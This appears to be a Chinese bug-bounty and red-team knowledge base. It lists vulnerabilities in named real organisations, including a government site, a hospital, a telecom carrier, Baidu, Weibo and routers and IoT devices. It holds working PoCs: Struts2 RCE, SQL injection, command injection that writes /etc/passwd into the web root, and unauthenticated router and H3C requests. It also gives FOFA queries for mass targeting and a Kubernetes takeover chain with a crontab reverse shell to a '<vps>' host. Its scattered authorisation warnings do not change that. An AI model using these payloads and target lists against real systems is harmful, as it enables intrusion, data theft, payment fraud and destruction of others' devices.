金融演练通过“供应链+社工”打穿：自制钓鱼页邮件钓到电子学习平台账号→后台文件上传 getshell（云服务器）→登录页水坑（伪装 Flash 升级）鱼叉打办公 PC→走 DNS/CS 绕过 AC 设备→内网 CVE-2020-1472（Zerologon）打域控。其中**钓鱼邮件、水坑、鱼叉均属红线动作，仅作 ATT&CK 复盘，禁止对真实目标实施**；可复用的是“第三方供应商平台常成突破口”与 Zerologon 域控利用认知。

**【24】转转 Zhuanzhuan（二手交易）**　media:`word_..._bc00d7f2c51e9bcf625b4ad542fe8fc57492290188703512`
转转漏洞链：① 订单 API 加 `callback=hijacking` 触发 JSONP，子域 CORS 宽松可劫持订单/用户信息；② `/zzopen/gameAccount/findOrderAccountInfo` 凭 orderId+uid（来自 JSONP）越权读取游戏账号口令；③ APP scheme `aaaa://jump/core/web/jump?url=` 未校验致任意跳转；④ 租期 `num` 参数可改（1 元租 4 小时→改 24 小时）。属“JSONP劫持+IDOR+跳转+逻辑”组合，建议并入 logic-web-cases 作通用检查项。

**【25】桂平市人民医院 人力资源系统（任意文件读）**　media:`word_..._cabe06e237c33c27c5bf930a174b98b87492290188703512`
桂平市人民医院人力资源管理系统 `218.65.238.x:8081` 存在 Resin 文档目录任意文件读取：访问 `/resin-doc/viewfile/?file=index.jsp` 即可读取服务器文件内容（PoC 成功读到 index.jsp 源码）。属“Resin viewfile 任意文件读取”中高危。该类 Resin 老漏洞在医疗/企业系统常见，FOFA 可按 Resin Server 指纹定位。提交建议确认能否跳出 web 根读系统文件与配置文件。

**【26】生态环境部（Struts2 S2-016）**　media:`word_..._b56831d3aadf7cdbc798cf0d4e4cd4827492290188703512`
生态环境部站点 `rr.mee.gov.cn`（全国核技术利用辐射安全申报系统）的 `/resetpwd_getServerDate.action` 存在 Struts2 S2-016 命令执行，工具一键验证可 `ping` 回显。属“Struts2 RCE”严重。政府老系统 Struts2 框架存量大，action 名（`resetpwd_*`/`getServerDate`）可作指纹批量扫。实战须严守授权与“不破坏”原则，仅验证命令回显即可，勿写文件/反弹。

**【27】百度爱番番（CRM 支付逻辑）**　media:`word_..._7efe732b0a24edcdc51be090db25c33f7492290188703512`
百度爱番番 CRM 下单逻辑为“总金额=单价×数量”，确认订单时服务端未重新核算，抓包将单价改为 `0.01` 可使原价 7980 元的“用户数加油包”以 0.03 元下单并支付成功，绕过企业资质审核。属“支付逻辑缺陷”中危，报告注明“该漏洞已修复”。同类问题（改数量/改状态/负数正负抵消）在电商普遍，建议沉淀为支付类通用检查项并入 logic-web-cases。

**【28】微博 会员跨年狂欢趴（活动逻辑）**　media:`word_..._d1cb07f3bbe6051ac304142705a80f997492290188703512`
微博会员活动“每日开箱”接口 `POST /v1/act/handle` 体 `{"actid":1}`，前端显示“不在举办时间”仍可抓包重放成功抽奖并领取 58 元抵扣券，绕过活动时间校验。属“活动逻辑缺陷”中危。此类活动 Bug 单站价值低、易判重复，宜作为“活动时间/次数校验缺失”通用项留存，而非逐活动提交。

**【29】小度商城（Baidu dumall 秒杀绕过）**　media:`word_..._a25d13f08c8dbcb904e6aeff59dd56dc7492290188703512`
小度商城 `dumall.baidu.com` 限时秒杀限制“每人 1 个”，但下单 JSON 中 `itemQuantity` 可控，抓包改为 2 即成功以秒杀价购买 2 件并付款。属“限购/数量限制绕过（薅羊毛）”低中危。与 oppo 突破购买数量同类，建议并入 logic-web-cases 的“数量参数篡改”通用项；实战提交常因“无实质资损/已修复”低评级。

**【30】中国电信综合办公系统（SQL 注入）**　media:`word_..._6c0b1444d3d62e410e4c4f30e425505d7492290188703512`
中国电信综合办公系统 `218.93.20.x:6060` 登录接口 `POST /login.do` 中 `username` 参数存在 MySQL 时间盲注（`dispatch=loginCheck&username=test' AND (SELECT SLEEP(5))...`），sqlmap 确认当前用户为 DBA。属“SQLi”高危。运营商自研办公系统常带此类注入，FOFA 难统一指纹，需按标题/body 定位。提交建议附延时与 DBA 证据，并确认是否可读通讯录等敏感表。

---

## 第五节　未精读清单（本批 131 条中未逐份深读）

> 去重规则：标题去 `(n)`/`_(n)`/`_20xxxxxxxxxxxx` 后缀后，file_size 相同视为同一份；size 不同须分别实读。本批已实读 30 份（含 1 份读取失败），其余按“与其他案例文件重叠 / 纯逻辑薅羊毛 / 同手法副本”降优先级处理，未在 vendor-system 维度逐份精读。

1. **oppo 突破购买数量**（3 份同 size，media:`word_..._48708ed468da7f972128bfee2cf7cd16` 等）— ⚠️ 读取失败（ima 返回“该文件获取失败”），按规则如实标注，未臆造内容；按逻辑类并入 logic-web-cases。
2. **腾讯位置任意手机注册** — 逻辑类（任意注册），已在 logic-web-cases 留痕，本表未精读。
3. **微博存在参加过期活动** — 已精读（#28），其 `_(1)` 同 size 副本合并。
4. **小度商城秒杀** — 已精读（#29），同 size 单份。
5. **百度爱番番** — 已精读（#27）。
6. **中国移动 (不打码)/(1)** — 运营商逻辑/配置类，与电信（#30）同类，未逐份精读。
7. **中国电信平台 (不打码)/(1)/(1)_(1)** — 与 #30 同 size（442880）合并，仅精读 1 份。
8. **北京高知图新教育 Neat Reader** — 教育阅读器，逻辑/功能类，未精读。
9. **第一更：教育src如何日刷百分 / _(1)(2)(3)** — 教育薅羊毛方法论，size 不同但同主题，并入 logic-web-cases。
10. **34-聊聊金融反欺诈那些事儿 / _20210506214052** — 同 size 金融方法论，未精读。
11. **红队技战术｜供应链+社工** — 已精读（#23）。
12. **因酷网校 / 针对某银行资产攻防演练 / wuzhicms / 熊海xhcms** — 已精读（#19/#20/#9/#10）。
13. 其余约 90 条为“单位名+通用漏洞（SQLi/上传/OA绕过）”的同手法副本或已在 attack-chain/sqli/file-upload 等案例文件覆盖者（泛微、致远、用友、若依、帝国 CMS、宇视、H3C、熵基、博达等），按交叉查重不再重复精读。

---

## 第六节　素材缺口与后续建议

1. **读取失败需补**：oppo 突破购买数量（3 份）ima 返回获取失败，建议稍后在 ima 客户端确认文件状态后补读；如确损坏，从逻辑类角度以“购买数量参数篡改”通用项补齐即可。
2. **云原生 / 容器 / K8s 类偏少**：本批仅保险云接管、充电通 actuator 涉及云；建议后续补充 EKS/ACK、K8s API Server 未授权、etcd 泄露、Docker Registry 未授权等厂商系统案例。
3. **安全设备指纹待扩**：仅电信网关默认口令 1 例；建议补 防火墙/IDS/ VPN/ 堡垒机（奇安信、深信服、天融信、启明星辰等）的未授权/默认口令/反序列化案例，形成“安全设备速查”子表。
4. **政府/国企系统需授权边界说明**：生态环境部 S2-016、兵器工业通达 OA 等均属高敏资产，入库时须标注“仅 SRC 白名单内提交、严禁未授权扫描”，避免被误用作实战指引。
5. **逻辑类分流**：美团 OAuth、百度/微博/小度/转转/oppo 等偏业务逻辑，已在 logic-web-cases 同步索引；vendor-system 表保留“厂商维度”即可，避免两份文件内容冲突。
6. **缺可复现 PoC 的纯审计笔记**：wuzhicms 仅有审计路径无稳定 PoC，建议补一个具体漏洞后再提升评级，否则仅作方法论留存。
7. ~~**云原生 / 容器 / K8s 类偏少**~~ → **2026-09-15 已补**：见 §7.2（K8s API Server 8080/6443 未授权 → 建 `hostPath` Pod → 写 SSH 公钥 / crontab / chroot 接管宿主机，含完整命令与 Pod YAML）。仍未覆盖：EKS/ACK 托管集群、etcd 未授权、Docker Registry 未授权。
8. ~~**安全设备指纹待扩**~~ → **2026-09-15 已补**：见 §7.1，一次补入 6 个可复用指纹（锐捷 NBR 全系 / 锐捷睿易 / 网心云 / H3C ER6300 / 宇视 ISC / 安美 HiBOS2）。**仍未覆盖**：奇安信、深信服、天融信、启明星辰等主流安全厂商的未授权与反序列化，以及堡垒机（JumpServer/齐治）类。

---

## 第七节　重挖补录 —— 网络设备 / 云原生 / 行业专有系统（2026-09-15）

> **为什么要重挖**：第一批 131 条里只精读了 30 条，其余约 90 条按"同手法副本 / 已在其他案例文件覆盖"降了优先级。复查发现这个判断错了 —— 被跳过的一批里其实藏着**全库唯一的网络设备与云原生素材**，而 §六 第 2、3 点列的"云原生偏少""安全设备指纹待扩"两个缺口，答案就在这批里。
> **本节 8 份为实读**（ima `src报告/其他/Web`），其余按标题级索引列于 §7.5，未精读的一律标注，不臆造内容。
> **红线**：涉及真实设备 IP、SN 码、激活码的一律不抄录，只留指纹与 PoC。

### 7.1 网络设备 / 物联网设备（CNVD 通报批）

**【31】锐捷 NBR 系列路由器 —— 一个 PoC 打穿 9 款型号**
- **PoC**：`GET http://<ip>:9999/index.data?opt=err&_=1663068005`（`_=` 后是时间戳，随意填）
- **影响型号**：RG-NBR700G / 700W / 700GW / 800GW / 900G / 1600G / 2600G / 2600S / 2800G（CNVD 2023-02-28）
- **吐出的东西**：`vs` 固件版本、`sq_ver` 序列号、`platform` 硬件平台（RA-338 / RT-7621 / CM / NEW-X86）、各 WAN 口 `wan_ip`/`wan_mask`/`wan_gw`/`wan_proto`（static 或 **pppoe**）、LAN 口 link 状态、`ct_num` 在线终端数、`mem_free`
- **FOFA**：`title="锐捷网络" && port="9999" && country="CN" && category="路由器"`（通报当天 2035 条独立 IP）
- **⚠️ 最有价值的一点**：响应里的 `tit` 字段是 `WayOS千M多WAN智能路由器` / `WayOS 我的路由，我做主！www.wayos.cn` —— **锐捷 NBR 系列底层是 WayOS 固件贴牌**。所以：
  - WayOS 的通用漏洞可直接横向打到锐捷 NBR，反之亦然；
  - 找这类设备别只搜品牌名，要顺手搜**固件商名**（`WayOS`、`LuCI`、`Miniware`）；
  - 提交时如果只写"锐捷某型号未授权"，厂商可能回"已收录"；写清"WayOS 固件层通病、影响 N 个品牌型号"才算新东西。

**【32】锐捷睿易网关 —— `admin:admin` 直进 OpenWrt LuCI**
- 弱口令 `admin:admin`（CNVD 2023-01-13），影响 BCOS V2.5.8 / 2.5.10 / 2.5.10p2 / 2.5.10p3 / 2.5T2
- 登录后 URL 形如 `/cgi-bin/luci/;stok=<32位>/admin` —— **标准 OpenWrt LuCI 结构**，与 #31 同理，是"锐捷睿易 = OpenWrt LuCI 二次开发"
- 后台能看：PPPoE 拨号所在 WAN 口、MAC、主备 DNS、在线用户数与上网时长统计（**用户行为数据**）
- **端口不固定**：6060 / 8000 / 9001 都见到过，别只扫 80/443

**【33】网心云设备 —— 21.8 万资产、9999 端口免登录进后台**
- FOFA `app="网心云设备" && country="CN"`：**218,077 条匹配 / 212,739 独立 IP**（通报 2023-03-20），是本批资产量最大的一类
- 直接访问 `http://<ip>:9999/` 即进管理后台，无需任何认证，可见设备 SN 码、MAC、内网 IP 与掩码
- **危害不止信息泄露**：后台菜单里有「**提取日志 / 设备重启 / 设备复位**」—— 未授权即可对他人设备执行破坏性操作，评级比"读配置"高一档
- 这类"边缘计算/共享带宽盒子"属于**家宽 IDC 化设备**，资产量大、运维弱、几乎无 WAF，是 SRC/众测里性价比很高的面

**【34】H3C ER6300 —— 教科书式的"全站未授权"**
- FOFA `"H3C" && title=="ER6300系统管理"`（516 条），Server 头 `H3C-Miniware-Webs`，端口 5555 / 8080 / 8081 / 8888 / 8008
- 三处独立问题，**第三处才是重点**：
  1. **日志未授权下载**：`POST /ER6300_SYSLOG.log`，body `CMD=SYS_LOG&GO=maintain_logs.asp&param=&search_item=1&txtMaxRows=15&txtCurPageIndex=1&auto_refresh=0` → 直接下到 syslog 文件
  2. **未授权关闭登录验证码**：`POST /goform/aspForm`，body `CMD=SetExpiretime&GO=device_user_manage.asp&set_expiretime=5&...&set_vld_flag=1&vld_disable_flag=1&forcequituserid=` —— 把验证码关掉后即可无限爆破（该系列还存在 `admin/admin`）
  3. **整个 `/goform/aspForm` 端点无鉴权**：原报告作者的结论是"所有功能点都存在这种漏洞"。演示的是关 IDS 防护：`CMD=IDS&GO=protect_ids.asp&SET0=...&SET1=...`。**打法**：在已登录的自己设备上抓包，把请求头+body 用 HackBar 原样重放到别人的站点，即可未授权改配置
- **方法论价值**：遇到 `/goform/`、`/cgi-bin/luci/`、`CMD=xxx&GO=xxx.asp` 这类**老式嵌入式 Web 框架**，第一反应就该测"功能端点是否鉴权"，而不是先找注入。嵌入式设备里这种"CSRF 式未授权操作"比 SQLi 常见得多，且危害直接（改防火墙、改路由、加管理员）

**【35】宇视 ISC（ISC5000-E）—— 一句话 RCE**
- `GET /Interface/LogReport/LogReport.php?action=execUpdate&fileString=x;id>dudesuite.txt`
- 落文件：`/Interface/LogReport/dudesuite.txt`（`;` 截断后 `id>` 重定向到 web 可访问目录）
- 指纹：`title=="ISC5000-E"`
- 这是**回写文件型 RCE**，比无回显的命令执行好证明得多：写进去再 GET 回来，报告里一张图就够

**【36】安美数字 酒店宽带运营系统（HiBOS2）—— 管道符注入**
- `/manager/radius/server_ping.php?ip=127.0.0.1|cat%20/etc/passwd>../../pq.txt&id=1` → 访问 `/pq.txt`
- `ip` 参数无过滤，管道符 `|` 拼接，同样用 `>` 回写到 web 目录
- FOFA `"酒店宽带运营"`，原报告给了 11 个成功案例，端口 8088 / 8008 / 7443 / 7070 / 7080 / 8080 都有
- **注意**：这类"运维系统里的 ping/traceroute/nslookup 功能页"是命令注入的富集区，跟路由器、堡垒机、监控系统的诊断页面同源，见到就试

### 7.2 云原生 —— K8s API Server 未授权到宿主机接管

**【37】K8s API Server 未授权（8080 / 6443）完整链**

两个入口，成因完全不同：
- **8080（insecure-port）**：设计上就**没有任何认证授权**，默认不启动；开了就等于裸奔。注：**K8s 1.20 起该参数已移除**，所以 8080 未授权只出现在老集群或手工改 `kube-apiserver.yaml`（加 `--insecure-port=8080 --insecure-bind-address=0.0.0.0`）的环境
- **6443（secure-port）**：本身有认证，但未授权来自**运维误配** —— 执行了 `kubectl create clusterrolebinding cluster-system-anonymous --clusterrole=cluster-admin --user=system:anonymous`，把匿名用户绑到 cluster-admin。这是国内大量"K8s 未授权"的真实成因，排查时优先怀疑它

判定与利用（`${API}` = `http://ip:8080` 或 `https://ip:6443`）：
```bash
# 1) 判定：直接 GET /，能列出 paths 即未授权（正常会 403 Forbidden: User "system:anonymous"）
curl -k ${API}/

# 2) 不用在目标机上装 kubectl，本地远程打
kubectl -s ${API} cluster-info
kubectl -s ${API} get nodes -o wide
kubectl -s ${API} get pods -A

# 3) 进容器拿 shell（-n 命名空间 -it Pod 名；很多容器没 bash，改 /bin/sh）
kubectl -s ${API} exec -n default -it <pod> -- /bin/sh

# 4) 拿 dashboard token（base64 解一次即可登录 dashboard）
curl -k ${API}/api/v1/namespaces/kube-system/secrets/ | grep dashboard-admin
```
第 5 步 —— 建一个把宿主机根挂进来的 Pod（关键就是 `hostPath: path: /`）：
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: myapp
spec:
  containers:
  - image: nginx
    name: container
    volumeMounts:
    - mountPath: /mnt
      name: test
  volumes:
  - name: test
    hostPath:
      path: /
```
Pod 起来后进 shell，`/mnt` 就是宿主机根目录。三条落地：
- **写 SSH 公钥** → `echo "ssh-rsa AAAA..." >> /mnt/root/.ssh/authorized_keys`（注意：要先 `mkdir -p /mnt/root/.ssh`，直接 `>>` 会因目录不存在失败）
- **写 crontab 反弹** → `echo "*/1 * * * * /bin/bash -i >& /dev/tcp/<vps>/4444 0>&1" > /mnt/var/spool/cron/root`（比公钥稳，不依赖 sshd 配置）
- **直接 chroot** → `chroot /mnt`，连 `/etc/passwd` 都能读

> **SRC 提交要点**：K8s 未授权属于"配置错误"类，部分平台按中危收。**只证明 `get pods` 成功通常不够，要走到"已进入容器并读取宿主机文件"才算完整危害**。报告里给 `kubectl get nodes -o wide` + `cat /mnt/etc/passwd`（打码）两张图最省事。

### 7.3 三条可复用认知（本节最值钱的部分）

1. **找贴牌固件，不找品牌名。** 本批三次踩中：锐捷 NBR = **WayOS**（响应 `tit` 字段暴露）；锐捷睿易 = **OpenWrt LuCI**（URL 里的 `/cgi-bin/luci/;stok=` 暴露）；H3C ER 系列 = **Miniware-Webs**（Server 响应头暴露）。**打法**：拿到任一设备，先看 `Server` 响应头、`title`、JS 里的版权串、登录页源码注释，定位到固件商，再用固件商名去搜 PoC —— 一个 PoC 往往能横扫好几个品牌。反过来，提交时也要按"固件层通病"来写，避免被判"厂商已收录"。

2. **设备类资产藏在非标端口里，常规扫描会全漏。** 本批见到的端口：`9999`（网心云、锐捷 NBR 全系）、`6060/8000/9001`（锐捷睿易）、`5555/8080/8081/8888/8008`（H3C ER6300）、`8088/7443/7070/7080`（安美 HiBOS2）。**只扫 80/443/8080 会漏掉绝大多数**。这类设备还普遍不支持 HTTPS、无 WAF、无登录锁定，弱口令直接撞即可。

3. **嵌入式设备的头号问题不是注入，是"功能端点不鉴权"。** H3C 的 `/goform/aspForm`（改 IDS、关验证码、下日志全未授权）、网心云的后台（能复位设备）都是这一类。**测试顺序建议**：① 找默认口令/弱口令 → ② 找未授权可读的状态接口（`index.data`、`*.log`、`/actuator`、`status.asp`）→ ③ 抓一个自己的正常操作包，去掉 Cookie 重放，看功能端点是否鉴权 → ④ 最后才是注入和上传。

### 7.4 合规提醒

- **CNVD/CNCERT 已通报过的**（#31 锐捷 NBR、#32 锐捷睿易、#33 网心云、#34 H3C ER6300）按 SRC 规则大概率**判重复或已知**。这些条目的价值在于：① 同类资产横向时的**指纹和 PoC**；② 理解"固件层通病"的方法论；③ 未被通报的**同固件其他品牌**才是能提交的新目标。
- 网络设备后台普遍带"重启/复位/改路由"等**破坏性操作**，验证务必止步于"读取到配置"或"证明可调用功能"，**不要真执行重启/复位**，否则从漏洞提交变成破坏。
- 网心云这类家宽盒子背后是**个人用户**，报告中不得出现设备 SN、激活码、宽带账号。

### 7.5 本节未精读（标题级索引，需补读）

以下在本次重挖中定位到但**未实读**，按标题与已公开信息登记，**未写入任何未经核实的技术细节**：

| 标题 | 类型 | 备注 |
|---|---|---|
| 关于深圳市共济科技股份有限公司数据中心基础设施监控存在未授权访问漏洞的情况通报 | DCIM 动环 | 与 #34 同属基础设施监控面 |
| 关于 Xbrother 动环监控系统存在弱口令漏洞的情况通报 | 动环监控 | 弱口令类 |
| 关于惠普 MFP M226dw / HP Officejet Pro 251dw 存在未授权访问漏洞的情况通报 | 打印机/复合机 | 办公设备面，本库目前唯一 |
| Q-see 摄像头存在弱口令 | 安防摄像头 | 与 #35 宇视同属安防面 |
| 用友文件服务器未授权 | ERP 周边 | 与既有"用友"条目可能交叉，需查重 |
| AJ-Report 代码执行漏洞分析 | BI 报表组件 | 新组件指纹 |
| 上海博达数据通信有限公司 文件包含 | 网络设备 | 3 份同 size（3038720），读 1 份即可 |
| Joomla 存在命令执行漏洞 / Weblogic RCE(CVE-2023-21839) | 通用组件 | 通用性大于厂商性 |
| Bypass 某 VPN - rce 到内网横向 / 进入 vpn 后网段查找办法 | VPN 打点 | 偏攻击链，宜并入 `attack-chain-cases.md` |
| 丁香园未授权访问 / 指挥调度中心-未授权访问漏洞3 | 互联网·政务 | 非厂商系统，宜并入 `idor-cases.md` |
| 美团 api 站点命令执行漏洞 / 中国农业大学 SQL 注入_远程命令执行 | 互联网·高校 | 同上 |

### 7.6 框架级识别：JeeSite 系「一套路径横扫多家厂商」（2026-09-15 补录）

> 来源：订阅库「实战渗透与漏洞挖掘指南」`src2024` 目录复核（与主库同源，见文首处置账）。**入库前全库 grep `JeeSite` / `/a/sys/` / `registerUser` 零命中，确认为新增。**

**现象**：多家**互不相关**的厂商/单位系统，报送材料里的入口 URL 完全同型：

| 被测系统 | 入口 | 参数形态 |
|---|---|---|
| 江苏兴光 项目管理 CCPM / 兴光信息系统 | `http://<host>/a/sys/user/resetPassword` | `?&mobile=88888888888'` |
| 天津宏达 能源热力设备管理平台 | `/a/sys/register/registerUser` | `?&mobile=18888888888'` |
| 山东迪彩 信息管理平台 | `/a/sys/register/registerUser` | `?&mobile=18888888888'` |
| 河南同源 业务员管理系统 | `/a/login;JSESSIONID=...` | — |

**判读**：`/a/` 前缀 + `;JSESSIONID=` URL 重写 + `sys/user`、`sys/register`、`sys/role`、`sys/menu` 这类控制器命名，是 **JeeSite**（国产 Java 快速开发平台）的固定路由形态。上列厂商只是拿 JeeSite 做二次开发，**底层同一套代码**——所以漏洞不是"厂商的漏洞"，是"框架的漏洞"。

**可复用手法：认框架 > 认厂商**

1. **指纹**：`body="/a/sys/"`、`body="jeesite"`；登录页多在 `/a/login`，URL 带 `;JSESSIONID=` 是强特征。
2. **一个入口打穿同框架全部站点**：`sys/register/registerUser`、`sys/user/resetPassword` 的 `mobile` 参数**直接拼 SQL、无参数化**，加单引号即报错或延时。改 `Host` 即可复用到同框架其他资产——与 `logic-web-cases.md` §「改 Host 打同框架其他站点，通杀约 15 个系统」同一思路，但这里是**从指纹进、非从漏洞进**。
3. **批量优先级**：先按框架语法测绘出全部同框架资产，再逐个验；比"按厂商名逐个搜 PoC"高效得多。
4. **提交注意**：同框架通杀极易被判"重复/已知框架问题"，报告必须落到**该单位独有资产 + 影响面**（可读到什么数据、多少账号），不能只给通用 PoC——同 §三的拒收经验。

**红线**：本表只留**路径形态与参数位置**，不含真实 IP 与活口令；`resetPassword` 类接口的验证**止步于报错/延时证明**，一律不得真正修改他人密码。
